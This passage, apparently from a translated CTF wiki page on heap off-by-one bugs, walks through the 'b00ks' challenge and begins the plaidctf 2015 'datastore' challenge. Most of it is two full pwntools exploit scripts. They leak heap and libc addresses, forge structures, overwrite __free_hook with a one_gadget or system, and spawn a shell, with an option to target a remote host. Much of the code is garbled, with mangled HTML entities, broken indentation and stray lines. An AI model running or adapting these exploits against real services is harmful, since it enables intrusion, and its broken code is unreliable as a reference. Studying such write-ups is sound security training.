0x555555756080: 0x0000000000000000  0x0000000000000000
</pre></div>

<p>In order to achieve the leak, first enter 32 bytes in the author name to make the terminator overwritten. After that we create book1, the pointer of book1 will overwrite the last NULL byte in author name, so that the pointer is directly connected with author name, so that the output author name can get a heap pointer.</p>
<div class="codehilite"><pre><span></span>io.recvuntil(&#39;Enter author name:&#39;) # input author name

io.sendline (&amp;#39;a&amp;#39; * 32)

io.recvuntil (&amp;#39;&amp;gt;&amp;#39;) # create book1
io.sendline ( &amp;#39;1&amp;#39;)
io.recvuntil(&#39;Enter book name size:&#39;)

io.sendline (&amp;#39;32 &amp;#39;)
io.recvuntil(&#39;Enter book name (Max 32 chars):&#39;)

io.sendline(&#39;object1&#39;)

io.recvuntil(&#39;Enter book description size:&#39;)

io.sendline (&amp;#39;32 &amp;#39;)
io.recvuntil(&#39;Enter book description:&#39;)

io.sendline(&#39;object1&#39;)



io.recvuntil (&amp;#39;&amp;gt;&amp;#39;) # print book1
io.sendline ( &amp;#39;4&amp;#39;)
io.recvuntil ( &amp;#39;Author:&amp;#39;)
io.recvuntil (&amp;#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;#39;) # &amp;lt;== leak book1
book1_addr = io.recv (6)
book1_addr = book1_addr.ljust (8, &amp;#39;x00&amp;#39;)
book1_addr = u64(book1_addr)
</pre></div>

<h4 id="off-by-one-override-pointer-low-byte">off-by-one Override pointer low byte<a class="headerlink" href="#off-by-one-override-pointer-low-byte" title="Permanent link">&para;</a></h4>
<p>The change function is also provided in the program. The change function is used to modify the author name, so the change can be used to write the author name, and the off-by-one is used to override the low byte of the first item of the pointer array.</p>
<p>After overwriting the low byte of the book1 pointer, this pointer points to the description of book1. Since the program provides the edit function, the content in the description can be arbitrarily modified. We can pre-define the data in the description to create a book structure. The description and name pointers of this book structure can be directly controlled.</p>
<div class="codehilite"><pre><span></span>def off_by_one(addr):

    addr += 58

    io.recvuntil(&#39;&gt;&#39;)# create fake book in description

io.sendline ( &amp;#39;3&amp;#39;)
    fake_book_data = p64(0x1) + p64(addr) + p64(addr) + pack(0xffff)

    io.recvuntil(&#39;Enter new book description:&#39;)

    io.sendline(fake_book_data) # &lt;== fake book





    io.recvuntil(&#39;&gt;&#39;) # change author name

io.sendline ( &amp;#39;5&amp;#39;)
    io.recvuntil(&#39;Enter author name:&#39;)

    io.sendline(&#39;a&#39; * 32) # &lt;== off-by-one
</pre></div>

<p>Here, the book is forged in the description, and the data used is p64(0x1)+p64(addr)+p64(addr)+pack(0xffff).
Where addr+58 is to point the pointer to the pointer address of book2, so that we can modify these pointer values arbitrarily.</p>
<h4 id="using-the-stack-to-achieve-utilization">Using the stack to achieve utilization<a class="headerlink" href="#using-the-stack-to-achieve-utilization" title="Permanent link">&para;</a></h4>
<p>Through the previous two parts, we have obtained the ability to read and write at any address. The reader may find that the following operations are obvious, such as writing the get table hijacking process or writing the __malloc_hook hijacking process. But the special thing about this topic is that PIE is turned on and there is no way to leak the libc base address, so we need to think about other methods.</p>
<p>The clever thing about this is that when you allocate a second book, use a large size to make the heap expand in mmap mode. We know that there are two ways to expand the heap. One is that brk will directly expand the original heap, and the other is that mmap will map a piece of memory separately.</p>
<p>Here we apply for an oversized block to extend memory using mmap. Because the memory allocated by mmap has a fixed offset from libc, the base address of libc can be derived.
<div class="codehilite"><pre><span></span>Start              End                Offset             Perm Path

0x0000000000400000 0x0000000000401000 0x0000000000000000 rx /home/vb/ Desktop/123/123
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/ Desktop/123/123
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/ Desktop/123/123
0x00007f8d638a3000 0x00007f8d63a63000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so

0x00007f8d63a63000 0x00007f8d63c63000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so

0x00007f8d63c63000 0x00007f8d63c67000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so

0x00007f8d63c67000 0x00007f8d63c69000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so

0x00007f8d63c69000 0x00007f8d63c6d000 0x0000000000000000 rw-

0x00007f8d63c6d000 0x00007f8d63c93000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so

0x00007f8d63e54000 0x00007f8d63e79000 0x0000000000000000 rw- &lt;=== mmap

0x00007f8d63e92000 0x00007f8d63e93000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so

0x00007f8d63e93000 0x00007f8d63e94000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so

0x00007f8d63e94000 0x00007f8d63e95000 0x0000000000000000 rw-

0x00007ffdc4f12000 0x00007ffdc4f33000 0x0000000000000000 rw- [stack]

0x00007ffdc4f7a000 0x00007ffdc4f7d000 0x0000000000000000 r-- [vvar]

0x00007ffdc4f7d000 0x00007ffdc4f7f000 0x0000000000000000 r-x [vdso]

0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
</pre></div></p>
<div class="codehilite"><pre><span></span>Start              End                Offset             Perm Path

0x0000000000400000 0x0000000000401000 0x0000000000000000 rx /home/vb/ Desktop/123/123
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/ Desktop/123/123
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/ Desktop/123/123
0x00007f6572703000 0x00007f65728c3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so

0x00007f65728c3000 0x00007f6572ac3000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so

0x00007f6572ac3000 0x00007f6572ac7000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so

0x00007f6572ac7000 0x00007f6572ac9000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so

0x00007f6572ac9000 0x00007f6572acd000 0x0000000000000000 rw-

0x00007f6572acd000 0x00007f6572af3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so

0x00007f6572cb4000 0x00007f6572cd9000 0x0000000000000000 rw- &lt;=== mmap

0x00007f6572cf2000 0x00007f6572cf3000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so

0x00007f6572cf3000 0x00007f6572cf4000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so

0x00007f6572cf4000 0x00007f6572cf5000 0x0000000000000000 rw-

0x00007fffec566000 0x00007fffec587000 0x0000000000000000 rw- [stack]

0x00007fffec59c000 0x00007fffec59f000 0x0000000000000000 r-- [vvar]

0x00007fffec59f000 0x00007fffec5a1000 0x0000000000000000 r-x [vdso]

0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
</pre></div>

<h4 id="exploit">exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;info&quot;</span>



<span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;b00ks&quot;</span><span class="p">)</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="o">./</span> <span class="n">b00ks</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>




<span class="k">def</span> <span class="nf">createbook</span><span class="p">(</span><span class="n">name_size</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">des_size</span><span class="p">,</span> <span class="n">des</span><span class="p">):</span>

<span class="n">io</span><span class="o">.</span><span class="n">readuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
<span class="n">io</span><span class="o">.</span><span class="n">readuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;:</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">name_size</span><span class="p">))</span>

<span class="n">io</span><span class="o">.</span><span class="n">readuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;:</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">readuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;:</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">des_size</span><span class="p">))</span>

<span class="n">io</span><span class="o">.</span><span class="n">readuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;:</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="n">des</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">printbook</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>

<span class="n">io</span><span class="o">.</span><span class="n">readuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="mi">4</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
<span class="n">io</span><span class="o">.</span><span class="n">readuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;:</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>

        <span class="n">book_id</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
<span class="n">io</span><span class="o">.</span><span class="n">readuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;:</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
        <span class="n">book_name</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

<span class="n">io</span><span class="o">.</span><span class="n">readuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;:</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
<span class="n">book_des</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">readline</span> <span class="p">()</span> <span class="p">[:</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span>
<span class="n">io</span><span class="o">.</span><span class="n">readuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;:</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
        <span class="n">book_author</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

    <span class="k">return</span> <span class="n">book_id</span><span class="p">,</span> <span class="n">book_name</span><span class="p">,</span> <span class="n">book_des</span><span class="p">,</span> <span class="n">book_author</span>



<span class="k">def</span> <span class="nf">createname</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>

<span class="n">io</span><span class="o">.</span><span class="n">readuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="n">name</span><span class="p">:</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>



<span class="k">def</span> <span class="nf">changename</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>

<span class="n">io</span><span class="o">.</span><span class="n">readuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="mi">5</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
<span class="n">io</span><span class="o">.</span><span class="n">readuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;:</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>



<span class="k">def</span> <span class="nf">editbook</span><span class="p">(</span><span class="n">book_id</span><span class="p">,</span> <span class="n">new_des</span><span class="p">):</span>

<span class="n">io</span><span class="o">.</span><span class="n">readuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="mi">3</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
<span class="n">io</span><span class="o">.</span><span class="n">readuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;:</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">book_id</span><span class="p">))</span>

<span class="n">io</span><span class="o">.</span><span class="n">readuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;:</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">new_des</span><span class="p">)</span>



<span class="k">def</span> <span class="nf">deletebook</span><span class="p">(</span><span class="n">book_id</span><span class="p">):</span>

<span class="n">io</span><span class="o">.</span><span class="n">readuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="mi">2</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
<span class="n">io</span><span class="o">.</span><span class="n">readuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;:</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">book_id</span><span class="p">))</span>



<span class="n">createname</span><span class="p">(</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">32</span><span class="p">)</span>

<span class="n">createbook</span><span class="p">(</span><span class="mi">128</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">)</span>

<span class="n">createbook</span><span class="p">(</span><span class="mh">0x21000</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">,</span> <span class="mh">0x21000</span><span class="p">,</span> <span class="s2">&quot;b&quot;</span><span class="p">)</span>





<span class="n">book_id_1</span><span class="p">,</span> <span class="n">book_name</span><span class="p">,</span> <span class="n">book_des</span><span class="p">,</span> <span class="n">book_author</span> <span class="o">=</span> <span class="n">printbook</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">book1_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">book_author</span><span class="p">[</span><span class="mi">32</span><span class="p">:</span><span class="mi">32</span><span class="o">+</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;book1_address:&quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">book1_addr</span><span class="p">))</span>



<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">book1_addr</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">book1_addr</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffff</span><span class="p">)</span>

<span class="n">editbook</span><span class="p">(</span><span class="n">book_id_1</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">changename</span><span class="p">(</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">32</span><span class="p">)</span>



<span class="n">book_id_1</span><span class="p">,</span> <span class="n">book_name</span><span class="p">,</span> <span class="n">book_des</span><span class="p">,</span> <span class="n">book_author</span> <span class="o">=</span> <span class="n">printbook</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">book2_name_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">book_name</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))</span>

<span class="n">book2_des_addr</span> <span class="o">=</span> <span class="n">u64</span> <span class="p">(</span><span class="n">book_des</span><span class="o">.</span><span class="n">ljust</span> <span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="n">x00</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;))</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;book2 name addr:&quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">book2_name_addr</span><span class="p">))</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;book2 des addr:&quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">book2_des_addr</span><span class="p">))</span>

<span class="n">libc_base</span> <span class="o">=</span> <span class="n">book2_des_addr</span> <span class="o">-</span> <span class="mh">0x5b9010</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;libc base:&quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>



<span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;__free_hook&quot;</span><span class="p">]</span>

<span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x4f322</span> <span class="c1"># 0x4f2c5 0x10a38c 0x4f322</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;free_hook:&quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;one_gadget:&quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>

<span class="n">editbook</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span>

<span class="n">editbook</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>



<span class="n">deletebook</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>



<span class="n">io</span><span class="o">.</span><span class="n">interactive</span> <span class="p">()</span>
</pre></div>

<h4 id="simple-plan">Simple plan<a class="headerlink" href="#simple-plan" title="Permanent link">&para;</a></h4>
<p>After any read and write, another way to find libc is to first cause the libc address to be written on the heap before any read and write, and then read it out by any read.</p>
<p>In order to find the offset where libc is located, you can debug directly through gdb to view the location of the specific libc address on the heap, without deliberate calculation.</p>
<p>Exp is as follows:</p>
<div class="codehilite"><pre><span></span>#! /usr/bin/env python2

# -*- coding: utf-8 -*-

# vim: hay = utf-8


import sys

import
import os.path

from pwn import *

context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)



if len(sys.argv) &gt; 2:

    DEBUG = 0

    HOST = sys.argv[1]

    PORT = int(sys.argv[2])



    p = remote(HOST, PORT)

else:

    DEBUG = 1

    if len(sys.argv) == 2:

        PATH = sys.argv[1]



    p = process(PATH)



def cmd(choice):

    p.recvuntil(&#39;&gt; &#39;)

    p.sendline(str(choice))





def create(book_size, book_name, desc_size, desc):

    cmd(1)

    p.recvuntil(&#39;: &#39;)

    p.sendline(str(book_size))

    p.recvuntil(&#39;: &#39;)

    if len(book_name) == book_size:

        p.send(book_name)

    else:

        p.sendline(book_name)

    p.recvuntil(&#39;: &#39;)

    p.sendline(str(desc_size))

    p.recvuntil(&#39;: &#39;)

    if len(desc) == desc_size:

        p.send(desc)

    else:

        p.sendline(desc)





def remove(idx):

    cmd(2)

    p.recvuntil(&#39;: &#39;)

    p.sendline(str(idx))





def edit(idx, desc):
    cmd(3)

    p.recvuntil(&#39;: &#39;)

    p.sendline(str(idx))

    p.recvuntil(&#39;: &#39;)

    p.send(desc)





def author_name(author):

    cmd(5)

    p.recvuntil(&#39;: &#39;)

    p.send(author)





libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)



def main():

    # Your exploit script goes here



    # leak heap address

    p.recvuntil(&#39;name: &#39;)

    p.sendline(&#39;x&#39; * (0x20 - 5) + &#39;leak:&#39;)



    create(0x20, &#39;tmp a&#39;, 0x20, &#39;b&#39;) # 1

    cmd(4)

    p.recvuntil(&#39;Author: &#39;)

    p.recvuntil(&#39;leak:&#39;)

    heap_leak = u64(p.recvline().strip().ljust(8, &#39;\x00&#39;))

    p.info(&#39;heap leak @ 0x%x&#39; % heap_leak)

    heap_base = heap_leak - 0x1080



    create(0x20, &#39;buf 1&#39;, 0x20, &#39;desc buf&#39;) # 2

    create(0x20, &#39;buf 2&#39;, 0x20, &#39;desc buf 2&#39;) # 3

    remove(2)

    remove(3)



ptr = heap_base + 0x1180
payload = p64 (0) + p64 (0x101) + p64 (ptr - 0x18) + p64 (ptr - 0x10) + &amp;#39;\ x00&amp;#39;
    create(0x20, &#39;name&#39;, 0x108, &#39;overflow&#39;) # 4

    create(0x20, &#39;name&#39;, 0x100 - 0x10, &#39;target&#39;) # 5

    create(0x20, &#39;/bin/sh\x00&#39;, 0x200, &#39;to arbitrary read write&#39;) # 6



    edit(4, payload) # overflow

    remove(5) # unlink



    edit(4, p64(0x30) + p64(4) + p64(heap_base + 0x11a0) + p64(heap_base + 0x10c0) + &#39;\n&#39;)



    def write_to(addr, content, size):

        edit(4, p64(addr) + p64(size + 0x100) + &#39;\n&#39;)

        edit(6, content + &#39;\n&#39;)



    def read_at(addr):

        edit(4, p64(addr) + &#39;\n&#39;)

        cmd(4)

        p.recvuntil(&#39;Description: &#39;)

        p.recvuntil(&#39;Description: &#39;)

        p.recvuntil(&#39;Description: &#39;)

        content = p.recvline()[:-1]

        p.info(content)

        return content



    libc_leak = u64(read_at(heap_base + 0x11e0).ljust(8, &#39;\x00&#39;)) - 0x3c4b78

    p.info(&#39;libc leak @ 0x%x&#39; % libc_leak)



    write_to(libc_leak + libc.symbols[&#39;__free_hook&#39;], p64(libc_leak + libc.symbols[&#39;system&#39;]), 0x10)

    remove(6)



    p.interactive()



if __name__ == &#39;__main__&#39;:

    main()
</pre></div>

<h2 id="instance-2-plaidctf-2015-plaiddb">Instance 2 : plaidctf 2015 plaiddb<a class="headerlink" href="#instance-2-plaidctf-2015-plaiddb" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span>➜  2015_plaidctf_datastore git:<span class="o">(</span>master<span class="o">)</span> file datastore

datastore: ELF <span class="m">64</span>-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.24, BuildID<span class="o">[</span>sha1<span class="o">]=</span>1a031710225e93b0b5985477c73653846c352add, stripped

➜  2015_plaidctf_datastore git:<span class="o">(</span>master<span class="o">)</span> checksec datastore

<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/off_by_one/2015_plaidctf_datastore/datastore&#39;</span>

    Arch:     amd64-64-little

    RELRO:    Full RELRO

    Stack:    Canary found

    NX:       NX enabled

    PIE:      PIE enabled

    FORTIFY:  Enabled

➜  2015_plaidctf_datastore git:<span class="o">(</span>master<span class="o">)</span>
</pre></div>

<p>As you can see, the program is 64-bit dynamically linked. The protection is all turned on.</p>
<h3 id="functional-analysis">Functional Analysis<a class="headerlink" href="#functional-analysis" title="Permanent link">&para;</a></h3>
<p>Key data structure:</p>
<div class="codehilite"><pre><span></span>struct Node {

char * key;
    long data_size;

    char *data;

    struct Node *left;

    struct Node *right;

    long dummy;

    long dummy1;

}
</pre></div>

<p>The structure of the binary tree is mainly used to store data, and the specific storage process does not affect the utilization.</p>
<p>The function function needs to pay attention to <code>getline</code> (self-implemented single-line read function):</p>
<div class="codehilite"><pre><span></span>char *__fastcall getline(__int64 a1, __int64 a2)

{

  char *v2; // r12

char * v3; // rbx
  size_t v4; // r14

char v5; // al
char v6; // bp
  signed __int64 v7; // r13

  char *v8; // rax



V2 = (char *)malloc(8uLL); // Initially use malloc(8) for allocation
v3 = v2;
V4 = malloc_usable_size(v2); // Calculated the available size, for example, for malloc(8), this should be 24
  while ( 1 )

  {

    v5 = _IO_getc(stdin);
v6 = v5;
    if ( v5 == -1 )

      bye();

    if ( v5 == 10 )

      break;

v7 = v3 - v2;
    if ( v4 &lt;= v3 - v2 )

    {

V8 = (char *)realloc(v2, 2 * v4); // The size is not enough to multiply the available size by two for realloc
      v2 = v8;

      if ( !v8 )

      {

        puts(&quot;FATAL: Out of memory&quot;);

        exit(-1);

      }

v3 = &amp;amp; v8 [v7];
      v4 = malloc_usable_size(v8);

    }

*v3++ = v6; // &amp;lt;--- The vulnerability is where v3 is indexed and points to the next location. If the location is all used, it will point to the next non-writeable location.
  }

*v3 = 0; // &amp;lt;--- The vulnerability is located. Off by one (NULL byte overflow)
  return v2;

}
</pre></div>

<p>Several main features:</p>
<div class="codehilite"><pre><span></span>unsigned __int64 main_fn()

{

  char v1[8]; // [rsp+0h] [rbp-18h]

  unsigned __int64 v2; // [rsp+8h] [rbp-10h]



  v2 = __readfsqword(0x28u);

  puts(&quot;PROMPT: Enter command:&quot;);

  gets_checked(v1, 8LL);

  if ( !strcmp(v1, &quot;GET\n&quot;) )

  {

    cmd_get();

  }

  else if ( !strcmp(v1, &quot;PUT\n&quot;) )

  {

    cmd_put();

  }

  else if ( !strcmp(v1, &quot;DUMP\n&quot;) )

  {

    cmd_dump();

  }

  else if ( !strcmp(v1, &quot;DEL\n&quot;) )

  {

    cmd_del();

  }

  else

  {

    if ( !strcmp(v1, &quot;EXIT\n&quot;) )

      bye();

    __printf_chk(1LL, &quot;ERROR: &#39;%s&#39; is not a valid command.\n&quot;, v1);

  }

  return __readfsqword(0x28u) ^ v2;

}
</pre></div>

<p>Both <code>dump</code> and <code>get</code> are used to read the content, so <code>key</code> and specific data content can be read, and less attention is needed. Focus on <code>put</code> and <code>del</code>:</p>
<div class="codehilite"><pre><span></span>__int64 __fastcall cmd_put()

{

__int64 v0; // rsi
  Node *row; // rbx

  unsigned __int64 sz; // rax

char * v3; // rax
__int64 v4; // rbp
  __int64 result; // rax

  __int64 v6; // [rsp+0h] [rbp-38h]

  unsigned __int64 v7; // [rsp+18h] [rbp-20h]



